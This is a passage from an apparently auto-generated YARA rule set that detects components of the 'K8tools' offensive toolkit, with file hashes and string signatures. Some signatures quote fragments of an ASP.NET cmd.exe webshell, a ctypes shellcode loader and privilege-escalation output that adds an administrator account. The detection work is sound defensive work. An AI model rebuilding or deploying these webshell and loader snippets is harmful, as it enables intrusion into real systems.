      $s13 = "h8!DhO8" fullword ascii /* score: '1.00'*/
      $s14 = "bi_),M" fullword ascii /* score: '1.00'*/
      $s15 = "Bwn(!1" fullword ascii /* score: '1.00'*/
      $s16 = "pl_%8\"" fullword ascii /* score: '1.00'*/
      $s17 = "w\\kF(K" fullword ascii /* score: '1.00'*/
      $s18 = "X_X\"<&*" fullword ascii /* score: '1.00'*/
      $s19 = "QJe-=\\" fullword ascii /* score: '1.00'*/
      $s20 = "?M-eLv4)" fullword ascii /* score: '1.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 26000KB and ( 8 of them )
      ) or ( all of them )
}

rule _________________K8____________4_______32 {
   meta:
      description = "K8tools - from files 图标提取器.exe, K8侠盗猎车4外挂.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "8cbdeef4d9e8fa820f173e3e7ed48f5bd20f85f8c8e31e22093cf7fc46a77ed1"
      hash2 = "21694f63f97700aee216772f10044bb78c2c0780a07aac17a2333d8bf3e6e6e0"
   strings:
      $s1 = "Failed to load kernel library!" fullword ascii /* score: '12.00'*/
      $s2 = "Failed to decompress data!" fullword ascii /* score: '10.00'*/
      $s3 = "Failed to read data from the file!" fullword ascii /* score: '10.00'*/
      $s4 = "krnln.fnr" fullword ascii /* score: '10.00'*/
      $s5 = "krnln.fne" fullword ascii /* score: '10.00'*/
      $s6 = "Failed to read file or invalid data in file!" fullword ascii /* score: '10.00'*/
      $s7 = "Not found the kernel library!" fullword ascii /* score: '9.00'*/
      $s8 = "The kernel library is invalid!" fullword ascii /* score: '9.00'*/
      $s9 = "The interface of kernel library is invalid!" fullword ascii /* score: '9.00'*/
      $s10 = "GetNewSock" fullword ascii /* score: '9.00'*/
      $s11 = "Can't retrieve the temporary directory!" fullword ascii /* score: '7.01'*/
      $s12 = "Invalid data in the file!" fullword ascii /* score: '4.00'*/
      $s13 = "^}%950" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s14 = "Insufficient memory!" fullword ascii /* score: '4.00'*/
      $s15 = "\"WWSh(f@" fullword ascii /* score: '4.00'*/
      $s16 = "d09f2340818511d396f6aaf844c7e325" ascii /* score: '3.00'*/
      $s17 = "u hxb@" fullword ascii /* score: '1.00'*/
      $s18 = "[Sh,f@" fullword ascii /* score: '1.00'*/
      $s19 = "YYh p@" fullword ascii /* score: '1.00'*/
      $s20 = "PVh(f@" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and pe.imphash() == "9165ea3e914e03bda3346f13edbd6ccd" and ( 8 of them )
      ) or ( all of them )
}

rule _K8____________4_______K8____________4_______33 {
   meta:
      description = "K8tools - from files K8侠盗猎车4外挂.exe, K8侠盗猎车4外挂.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "21694f63f97700aee216772f10044bb78c2c0780a07aac17a2333d8bf3e6e6e0"
      hash2 = "21694f63f97700aee216772f10044bb78c2c0780a07aac17a2333d8bf3e6e6e0"
   strings:
      $s1 = "PROFESSIONALTOOLS - " fullword ascii /* score: '12.00'*/
      $s2 = "\"\"\"!!!!!!!!!" fullword ascii /* score: '10.00'*/
      $s3 = "\"\"\"\"\"\"\"\"\"\"\"\"!!!" fullword ascii /* score: '10.00'*/
      $s4 = "$$$%%%%%%%%%%%%!!!" fullword ascii /* score: '10.00'*/
      $s5 = "\"\"\"\"\"\"!!!" fullword ascii /* score: '10.00'*/
      $s6 = "!!!   " fullword ascii /* reversed goodware string '   !!!' */ /* score: '7.17'*/
      $s7 = "###!!!" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s8 = "!!!!!!" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s9 = "\"\"\"###" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s10 = "!!!" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s11 = "!!!!!!!!!   " fullword ascii /* score: '1.07'*/
      $s12 = "###\"\"\"" fullword ascii /* score: '1.00'*/
      $s13 = "$$$%%%%%%%%%%%%\"\"\"" fullword ascii /* score: '1.00'*/
      $s14 = "%%%++++++++++++)))###" fullword ascii /* score: '1.00'*/
      $s15 = "######   " fullword ascii /* score: '0.07'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and pe.imphash() == "9165ea3e914e03bda3346f13edbd6ccd" and ( 8 of them )
      ) or ( all of them )
}

rule _k8cmd_k8cmd_34 {
   meta:
      description = "K8tools - from files k8cmd.aspx, k8cmd.ascx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "91bbcd02bafd8840348e010d4daf15b566dbedac44c3e5cd9e0b11709c614241"
      hash2 = "92e9e987a994b27cfaa6b7d05e7a51534ff96bbc73616fdefe2eaf85461dc1f6"
   strings:
      $s1 = "psi.FileName = \"cmd.exe\";" fullword ascii /* score: '28.00'*/
      $s2 = "psi.UseShellExecute = false;" fullword ascii /* score: '21.17'*/
      $s3 = "<asp:Button ID=\"Button1\" runat=\"server\" onclick=\"cmdExe_Click\" Text=\"Execute\" /><br /><br />" fullword ascii /* score: '21.00'*/
      $s4 = "<HTML><body ><form id=\"cmd\" method=\"post\" runat=\"server\">" fullword ascii /* score: '17.00'*/
      $s5 = "ProcessStartInfo psi = new ProcessStartInfo();" fullword ascii /* score: '15.00'*/
      $s6 = "Process p = Process.Start(psi);" fullword ascii /* score: '15.00'*/
      $s7 = "void cmdExe_Click(object sender, System.EventArgs e)" fullword ascii /* score: '10.00'*/
      $s8 = "<asp:Label ID=\"Label2\" runat=\"server\" Text=\"Commond: \"></asp:Label>" fullword ascii /* score: '10.00'*/
      $s9 = "<asp:TextBox ID=\"cmdResult\" runat=\"server\" Height=\"662px\" Width=\"798px\" TextMode=\"MultiLine\"></asp:TextBox>" fullword ascii /* score: '10.00'*/
      $s10 = "<asp:TextBox ID=\"txt_cmd\" runat=\"server\" Width=\"581px\"></asp:TextBox>&nbsp;" fullword ascii /* score: '10.00'*/
      $s11 = "psi.RedirectStandardOutput = true;" fullword ascii /* score: '7.17'*/
      $s12 = "string ExcuteCmd(string arg)" fullword ascii /* score: '7.00'*/
      $s13 = "StreamReader stmrdr = p.StandardOutput;" fullword ascii /* score: '7.00'*/
      $s14 = "string s = stmrdr.ReadToEnd();" fullword ascii /* score: '7.00'*/
      $s15 = "<asp:TextBox ID=\"txt_WebPath\" runat=\"server\" Width=\"579px\"></asp:TextBox>" fullword ascii /* score: '7.00'*/
      $s16 = "stmrdr.Close();" fullword ascii /* score: '7.00'*/
      $s17 = "&nbsp; <br />" fullword ascii /* score: '4.42'*/
      $s18 = "txt_WebPath.Text = Server.MapPath(\".\");" fullword ascii /* score: '4.00'*/
      $s19 = "WebPath:" fullword ascii /* score: '4.00'*/
      $s20 = "void Page_Load(object sender, EventArgs e)" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
   condition:
      ( ( uint16(0) == 0xbbef or uint16(0) == 0x253c ) and filesize < 4KB and ( 8 of them )
      ) or ( all of them )
}

rule _ScRunBase32_sshcrack_K8PortScan_ScRunBase64_scrun_sshcmd_35 {
   meta:
      description = "K8tools - from files ScRunBase32.exe, sshcrack.exe, K8PortScan.exe, ScRunBase64.exe, scrun.exe, sshcmd.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "6973d802aef27a76a07067858ff47999e67ef02879786608bedc4f1b0508ac30"
      hash2 = "4a023e1b9ff0a1ac7df76764e708770eacc50a76efa38f7d339ecc0c72daccd9"
      hash3 = "43feb173eea41cddec443266f5abadccabe9fb02e47868f1d737ce4f2347690e"
      hash4 = "de72bfa9415cda80d9ee956c784bea7760c72e041bbdbeefe2f6ad44ab920273"
      hash5 = "406fa2253f7568e45639a0e0391949d66637f412b91c0dab6eaad5b97d30c0b2"
      hash6 = "4aa373d8f124c0f1143d6cb8e339e518a6fb058433aa46c1868900d093dc1dcd"
   strings:
      $s1 = "YAqo;p_" fullword ascii /* score: '4.00'*/
      $s2 = "SYqqEgg" fullword ascii /* score: '4.00'*/
      $s3 = "\\ffIJv" fullword ascii /* score: '2.00'*/
      $s4 = "&Wq]Y\\Ur,;`5 " fullword ascii /* score: '1.42'*/
      $s5 = "P9aZRB}" fullword ascii /* score: '1.00'*/
      $s6 = "bJcNPl" fullword ascii /* score: '1.00'*/
      $s7 = "Hl9)i9" fullword ascii /* score: '1.00'*/
      $s8 = "UNm}m9UwW" fullword ascii /* score: '1.00'*/
      $s9 = "0ev?{Gy" fullword ascii /* score: '1.00'*/
      $s10 = "*f1k@V?e" fullword ascii /* score: '1.00'*/
      $s11 = "y<,zdS" fullword ascii /* score: '1.00'*/
      $s12 = "%n6?0~" fullword ascii /* score: '1.00'*/
      $s13 = "$}lZH8@" fullword ascii /* score: '1.00'*/
      $s14 = "rQ~TbC" fullword ascii /* score: '1.00'*/
      $s15 = "+|?\"MKcv" fullword ascii /* score: '1.00'*/
      $s16 = "IQb$[c" fullword ascii /* score: '1.00'*/
      $s17 = "3'~vIXh" fullword ascii /* score: '1.00'*/
      $s18 = "*b9a@9" fullword ascii /* score: '1.00'*/
      $s19 = "@=c<}d(T" fullword ascii /* score: '1.00'*/
      $s20 = "cB#hD?gU" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 28000KB and pe.imphash() == "4df47bd79d7fe79953651a03293f0e8f" and ( 8 of them )
      ) or ( all of them )
}

rule _K8Packwebshell_K8Packwebshell_36 {
   meta:
      description = "K8tools - from files K8Packwebshell.aspx, K8Packwebshell.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "1af14893030942261150691b7b70de3443f33d92d6f266153b78755d27751a88"
      hash2 = "1af14893030942261150691b7b70de3443f33d92d6f266153b78755d27751a88"
   strings:
      $s1 = "if (TargetFile != null)" fullword ascii /* score: '14.00'*/
      $s2 = "System.Console.Write(\" {0:X2}\", bytes[j]);" fullword ascii /* score: '10.00'*/
      $s3 = "System.Console.WriteLine(\"\\n\");" fullword ascii /* score: '10.00'*/
      $s4 = "_TotalBytesRead += count;" fullword ascii /* score: '7.00'*/
      $s5 = "n = s.Read(block, 0, block.Length);" fullword ascii /* score: '7.00'*/
      $s6 = "txtPackPath.Value = Server.MapPath(\".\");" fullword ascii /* score: '7.00'*/
      $s7 = "if (j + 1 < n)" fullword ascii /* score: '5.00'*/
      $s8 = "_writestream = null;" fullword ascii /* score: '4.17'*/
      $s9 = "if (txtPackPath.Value == \"\")" fullword ascii /* score: '4.00'*/
      $s10 = "else if (Directory.Exists(txtPackPath.Value))" fullword ascii /* score: '4.00'*/
      $s11 = "foreach (ZipEntry e in _entries)" fullword ascii /* score: '4.00'*/
      $s12 = "if (output != null) output.Write(buffer, 0, count);" fullword ascii /* score: '4.00'*/
      $s13 = "byte[] bytes = new byte[4096];" fullword ascii /* score: '4.00'*/
      $s14 = "if ((j > 0) && (j % 40 == 0))" fullword ascii /* score: '4.00'*/
      $s15 = "int n;" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s16 = "for (int j = 0; j < n; j += 2)" fullword ascii /* score: '1.00'*/
      $s17 = "<td class=\"style6\">" fullword ascii /* score: '0.00'*/
   condition:
      ( uint16(0) == 0xbbef and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _K8Packwebshell_K8outSQL_37 {
   meta:
      description = "K8tools - from files K8Packwebshell.aspx, K8outSQL.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "1af14893030942261150691b7b70de3443f33d92d6f266153b78755d27751a88"
      hash2 = "bcc123dfa6267340f7a99f63d5deb277e7b8065335867459c4099bc58eaaf885"
   strings:
      $s1 = "<form id=\"form1\" runat=\"server\">" fullword ascii /* score: '7.00'*/
      $s2 = ".style11" fullword ascii /* score: '4.00'*/
      $s3 = "<head runat=\"server\">" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s4 = ".style8" fullword ascii /* score: '1.00'*/
      $s5 = ".style2" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0xbbef and filesize < 200KB and ( all of them )
      ) or ( all of them )
}

rule _ms11_046_ms11_080_38 {
   meta:
      description = "K8tools - from files ms11-046.exe, ms11-080.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "5e6be71e2c481b678c0352bc8963d28d70c6633fc1e8ec572f903406f4f3d2cf"
      hash2 = "6a068efcfeb7c0e27c308913bd394ad29da3eccbd740c3fbabb7ead161e188b2"
   strings:
      $s1 = "[*] Token system command" fullword ascii /* score: '26.00'*/
      $s2 = "[*] command add user k8gege k8gege" fullword ascii /* score: '23.01'*/
      $s3 = "[*] User has been successfully added" fullword ascii /* score: '15.00'*/
      $s4 = "[*] Add to Administrators success" fullword ascii /* score: '8.00'*/
      $s5 = "Administrators" fullword wide /* PEStudio Blacklist: strings */ /* score: '4.88'*/ /* Goodware String - occured 119 times */
      $s6 = "[>] by k8gege" fullword ascii /* score: '1.00'*/
      $s7 = "u`Whtp@" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and pe.imphash() == "f1038e72c8589e831cca550338ef31b2" and ( all of them )
      ) or ( all of them )
}

rule _ScRunBase32_ScRunBase64_scrun_39 {
   meta:
      description = "K8tools - from files ScRunBase32.py, ScRunBase64.py, scrun.py"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "9982d8a1885bcf5cd0ec01a0a3fec4434c09ea1bfc8d5508441b4aac46d33977"
      hash2 = "e174e98a8c9c3b6380422cfd577f4a05b9387e842a1717a4bf0e55d4ec04848f"
      hash3 = "a545a712256100507284fc9bc253706348ad0ae95972f0940dad02cc16a5b73a"
   strings:
      $s1 = "ctypes.c_int(len(shellcode))," fullword ascii /* score: '18.00'*/
      $s2 = "ctypes.c_int(len(shellcode)))" fullword ascii /* score: '18.00'*/
      $s3 = "buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)" fullword ascii /* score: '18.00'*/
      $s4 = "#calc.exe" fullword ascii /* score: '15.00'*/
      $s5 = "ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr)," fullword ascii /* score: '12.00'*/
      $s6 = "ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0)," fullword ascii /* score: '12.00'*/
      $s7 = "ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))" fullword ascii /* score: '12.00'*/
      $s8 = "ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0)," fullword ascii /* score: '9.00'*/
      $s9 = "ctypes.pointer(ctypes.c_int(0)))" fullword ascii /* score: '7.00'*/
      $s10 = "#scrun by k8gege" fullword ascii /* score: '7.00'*/
      $s11 = "ctypes.c_int(0x40))" fullword ascii /* score: '4.00'*/
      $s12 = "ctypes.c_int(0x3000)," fullword ascii /* score: '4.00'*/
      $s13 = "ctypes.c_int(0)," fullword ascii /* score: '4.00'*/
      $s14 = "ctypes.c_int(ptr)," fullword ascii /* score: '4.00'*/
      $s15 = "import ctypes" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s16 = "buf," fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x7323 and filesize < 5KB and ( 8 of them )
      ) or ( all of them )
}

rule _K8____________________________UPX_____________40 {
   meta:
      description = "K8tools - from files K8文件夹个性设置工具.exe, UPX加壳脱壳.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "86429eba2156c16011ae99f7097ac17182ef4d7bdabc6bc76661f87ec4b2d986"
      hash2 = "352112d9dc2e35ccc2ebeb7babea6e9fdd54622bc959ed0e6f83bb27d62784ed"
   strings:
      $s1 = "\\Dc*$7" fullword ascii /* score: '2.00'*/
      $s2 = "tIb5%." fullword ascii /* score: '1.00'*/
      $s3 = "9Ru8-@" fullword ascii /* score: '1.00'*/
      $s4 = "]Ll0*6" fullword ascii /* score: '1.00'*/
      $s5 = "=<O$(1" fullword ascii /* score: '1.00'*/
      $s6 = ".Ck$3P" fullword ascii /* score: '1.00'*/
      $s7 = "}Mu.,A" fullword ascii /* score: '1.00'*/
      $s8 = "2Mt0,@" fullword ascii /* score: '1.00'*/
      $s9 = "_Pu2(3" fullword ascii /* score: '1.00'*/
      $s10 = "FGc$Jd%Ha&>R$2?" fullword ascii /* score: '1.00'*/
      $s11 = "M@i!.I" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _laZagne_ScRunBase32_sshcrack_ScRunBase64_scrun_sshcmd_41 {
   meta:
      description = "K8tools - from files laZagne.exe, ScRunBase32.exe, sshcrack.exe, ScRunBase64.exe, scrun.exe, sshcmd.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "1f58bef31a99631a59437a93db2307a3f84b83221829a9851f355e401c74f0e6"
      hash2 = "6973d802aef27a76a07067858ff47999e67ef02879786608bedc4f1b0508ac30"
      hash3 = "4a023e1b9ff0a1ac7df76764e708770eacc50a76efa38f7d339ecc0c72daccd9"
      hash4 = "de72bfa9415cda80d9ee956c784bea7760c72e041bbdbeefe2f6ad44ab920273"
      hash5 = "406fa2253f7568e45639a0e0391949d66637f412b91c0dab6eaad5b97d30c0b2"
      hash6 = "4aa373d8f124c0f1143d6cb8e339e518a6fb058433aa46c1868900d093dc1dcd"
   strings:
      $s1 = "ctypes._endian(" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s2 = "b_ctypes.pyd" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s3 = "ctypes(" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s4 = "JZ@v\"7" fullword ascii /* score: '1.00'*/
      $s5 = "IRH|:3" fullword ascii /* score: '1.00'*/
      $s6 = "3E4)Mc" fullword ascii /* score: '1.00'*/
      $s7 = "<<@1/b" fullword ascii /* score: '1.00'*/
      $s8 = "W[:lJs|" fullword ascii /* score: '1.00'*/
      $s9 = "L(d,F%Fn(" fullword ascii /* score: '1.00'*/
      $s10 = "X\"KE[?N" fullword ascii /* score: '1.00'*/
      $s11 = "9YFA)S" fullword ascii /* score: '1.00'*/
      $s12 = "j5)min" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _K8_________ASP_______________________________K8COOKIE_K8___________________________________________42 {
   meta:
      description = "K8tools - from files K8一句话ASP木马客户端加强程序版.exe, K8COOKIE.rar, K8迅雷、快车、旋风地址互换工具.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "7b91ca796cadf146a90f642c28d25292ae9f1f5590d55adbe190dec77d5eb1a7"
      hash2 = "0f036dee84d9b1a07ad892708f016847b7bf64dfabd359ee5461ccd35a74a8b9"
      hash3 = "4097e04c7176bb6dd4c2ab8b49d73ee568de48ee864f76124f120be68bc304b0"
   strings:
      $s1 = "LrCx?$\\" fullword ascii /* score: '4.00'*/
      $s2 = "Vpv7 )" fullword ascii /* score: '1.00'*/
      $s3 = "fIe'uK" fullword ascii /* score: '1.00'*/
      $s4 = "J5Sbe/" fullword ascii /* score: '1.00'*/
      $s5 = "=iA!f`" fullword ascii /* score: '1.00'*/
      $s6 = "9;4.,]" fullword ascii /* score: '1.00'*/
      $s7 = "Rh4PtN" fullword ascii /* score: '1.00'*/
      $s8 = ",mKF\\T" fullword ascii /* score: '1.00'*/
      $s9 = "ls5dp3" fullword ascii /* score: '1.00'*/
      $s10 = "gy{L]*s" fullword ascii /* score: '1.00'*/
      $s11 = "<,d[OV" fullword ascii /* score: '1.00'*/
      $s12 = "SDb\"jy" fullword ascii /* score: '1.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x6152 ) and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _K8______________________UPX_____________K8______________________________V2_0_43 {
   meta:
      description = "K8tools - from files K8数字签名添加器.exe, UPX加壳脱壳.exe, K8随机免杀花指令生成器V2.0.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "23bcad4c1d3e1007e722582b1ff5ca373f78d2503a5d1b9a1907cfba47e6ed95"
      hash2 = "352112d9dc2e35ccc2ebeb7babea6e9fdd54622bc959ed0e6f83bb27d62784ed"
      hash3 = "06d1764eb0c4bdbd8a9c768cfdb2a78097df6d8d94a116db3295a7e290cc163e"
   strings:
      $s1 = "SP_PRIORYEAR" fullword wide /* score: '4.00'*/
      $s2 = "SP_NEXTMONTH" fullword wide /* score: '4.00'*/
      $s3 = "SP_PRIORMONTH" fullword wide /* score: '4.00'*/
      $s4 = "SP_NEXTYEAR" fullword wide /* score: '4.00'*/
      $s5 = "SP_VTB" fullword wide /* score: '1.00'*/
      $s6 = "SP_HTB" fullword wide /* score: '1.00'*/
      $s7 = "SP_BB_DOWN" fullword wide /* score: '1.00'*/
      $s8 = "SP_HRL" fullword wide /* score: '1.00'*/
      $s9 = "SP_BB_UP" fullword wide /* score: '1.00'*/
      $s10 = "SP_VRL" fullword wide /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and ( all of them )
      ) or ( all of them )
}

rule _K8Cscan_K8PortScan_Ladon_44 {
   meta:
      description = "K8tools - from files K8Cscan.py, K8PortScan.py, Ladon.py"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "a99c94d2657feb0a534f009edb3f3af252dcd7861a45bad9e85fa3c486bff50f"
      hash2 = "8c941f7a9d77ac45492b954d275b223983a8a2f33a88b8a9a0874a511ab6db20"
      hash3 = "e27c111f2d36c27f41b1dc1690dabee40d27d218d2ba76a6910352bf55da3678"
   strings:
      $s1 = "import argparse" fullword ascii /* score: '9.00'*/
      $s2 = "parser = argparse.ArgumentParser()" fullword ascii /* score: '4.17'*/
      $s3 = "ipc = (ip.split('.')[:-1])" fullword ascii /* score: '4.03'*/
      $s4 = "for i in range(1,256):" fullword ascii /* score: '4.00'*/
      $s5 = "args = parser.parse_args()" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s6 = "if '/24' in ip:" fullword ascii /* score: '1.00'*/
   condition:
      ( ( uint16(0) == 0xbbef or uint16(0) == 0x6d69 ) and filesize < 20KB and ( all of them )
      ) or ( all of them )
}

rule _WPdetection_K8____________________________K8________________45 {
   meta:
      description = "K8tools - from files WPdetection.exe, K8文件夹个性设置工具.exe, K8注册表跳转.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "a7812be575c83daf208722fa4bc577b7223bf3de42bb572635146bb24a2dfa09"
      hash2 = "86429eba2156c16011ae99f7097ac17182ef4d7bdabc6bc76661f87ec4b2d986"
      hash3 = "79287d5264d81bc40b9474faf0cce368e300eaf7efe0ddfea6e74f3b2321c930"
   strings:
      $s1 = "E\\rDOWBEO<,E$2" fullword ascii /* score: '4.00'*/
      $s2 = "5(,!)6" fullword ascii /* score: '1.00'*/
      $s3 = "5,: 5@" fullword ascii /* score: '1.00'*/
      $s4 = "Dr09d'" fullword ascii /* score: '1.00'*/
      $s5 = "59N\"4<" fullword ascii /* score: '1.00'*/
      $s6 = "5Vk\"Sz" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and ( all of them )
      ) or ( all of them )
}

rule _laZagne_sshcrack_web_K8PortScan_sshcmd_smbcheck_K8PortScan_Kali_x86_46 {
   meta:
      description = "K8tools - from files laZagne.exe, sshcrack.exe, web.exe, K8PortScan.exe, sshcmd.exe, smbcheck.exe, K8PortScan_Kali_x86"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "1f58bef31a99631a59437a93db2307a3f84b83221829a9851f355e401c74f0e6"
      hash2 = "4a023e1b9ff0a1ac7df76764e708770eacc50a76efa38f7d339ecc0c72daccd9"
      hash3 = "480638e653075f5c4326a228dd34e83dbfbb296c03367e1a3157e08ddf907e35"
      hash4 = "43feb173eea41cddec443266f5abadccabe9fb02e47868f1d737ce4f2347690e"
      hash5 = "4aa373d8f124c0f1143d6cb8e339e518a6fb058433aa46c1868900d093dc1dcd"
      hash6 = "767d4a583547d7d6da8fb5aa8602c33816908e90768a05696d311b497d57250b"
      hash7 = "0c15a74440d9fee10428f2b1882099586437ce460473bd71c4cacc5d108cbfe4"
   strings:
      $s1 = "contextlib(" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s2 = "G(ig;b" fullword ascii /* score: '1.00'*/
      $s3 = "CIF?G+.%" fullword ascii /* score: '1.00'*/
      $s4 = "d!'y)D1JS" fullword ascii /* score: '1.00'*/
      $s5 = "R}T?5@" fullword ascii /* score: '1.00'*/
      $s6 = "TCL2)d" fullword ascii /* score: '1.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 28000KB and ( all of them )
      ) or ( all of them )
}

rule _laZagne_sshcrack_web_K8PortScan_Suse10_x64_K8PortScan_sshcmd_smbcheck_47 {
   meta:
      description = "K8tools - from files laZagne.exe, sshcrack.exe, web.exe, K8PortScan_Suse10_x64, K8PortScan.exe, sshcmd.exe, smbcheck.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "1f58bef31a99631a59437a93db2307a3f84b83221829a9851f355e401c74f0e6"
      hash2 = "4a023e1b9ff0a1ac7df76764e708770eacc50a76efa38f7d339ecc0c72daccd9"
      hash3 = "480638e653075f5c4326a228dd34e83dbfbb296c03367e1a3157e08ddf907e35"
      hash4 = "b9df9b1eafdcc6c6440d4d924ac09262e736c94d22601722c7994bf12031f4a6"
      hash5 = "43feb173eea41cddec443266f5abadccabe9fb02e47868f1d737ce4f2347690e"
      hash6 = "4aa373d8f124c0f1143d6cb8e339e518a6fb058433aa46c1868900d093dc1dcd"
      hash7 = "767d4a583547d7d6da8fb5aa8602c33816908e90768a05696d311b497d57250b"
   strings:
      $s1 = "!MiI[:" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s2 = "D%&qIHRR" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s3 = "JkJ;JGJ" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s4 = "%!IIIZ2" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s5 = "}'v.(~" fullword ascii /* score: '1.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 28000KB and ( all of them )
      ) or ( all of them )
}

rule _K8COOKIE_K8___________________________________________48 {
   meta:
      description = "K8tools - from files K8COOKIE.rar, K8迅雷、快车、旋风地址互换工具.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "0f036dee84d9b1a07ad892708f016847b7bf64dfabd359ee5461ccd35a74a8b9"
      hash2 = "4097e04c7176bb6dd4c2ab8b49d73ee568de48ee864f76124f120be68bc304b0"
   strings:
      $s1 = "%.0pR-" fullword ascii /* score: '1.00'*/
      $s2 = "kI'u3S" fullword ascii /* score: '1.00'*/
      $s3 = "<=\"QZ*" fullword ascii /* score: '1.00'*/
      $s4 = "FugP#9" fullword ascii /* score: '1.00'*/
      $s5 = "[-8^v!" fullword ascii /* score: '1.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x6152 ) and filesize < 1000KB and pe.imphash() == "c3b39576ee50a54cb512992bf1d9062e" and ( all of them )
      ) or ( all of them )
}

rule _K8expList_README_49 {
   meta:
      description = "K8tools - from files K8expList.txt, README.md"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "54da2a39d83d8dd1dbb3cfeba1d6d145777999b1ebf79833eba92485f4824a16"
      hash2 = "c5535c5de8eeeff5f9e3fa680ea2edf1525ac93f41d5401dba91b8beeeaf0a85"
   strings:
      $s1 = "Magento" fullword ascii /* score: '11.00'*/
      $s2 = "Vbulletin" fullword ascii /* score: '6.00'*/
      $s3 = "Wordpress" fullword ascii /* score: '6.00'*/
      $s4 = "Drupal" fullword ascii /* score: '3.00'*/
      $s5 = "Zimbra" fullword ascii /* score: '3.00'*/
   condition:
      ( ( uint16(0) == 0x2023 or uint16(0) == 0x5430 ) and filesize < 40KB and ( all of them )
      ) or ( all of them )
}

rule _Usp10_______K8_Lpk_______K8_50 {
   meta:
      description = "K8tools - from files Usp10提权_K8.rar, Lpk提权_K8.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "e647f99cafed1a8a5a4f93af525629486ef92b3737de52f2eeac2ed83356f91c"
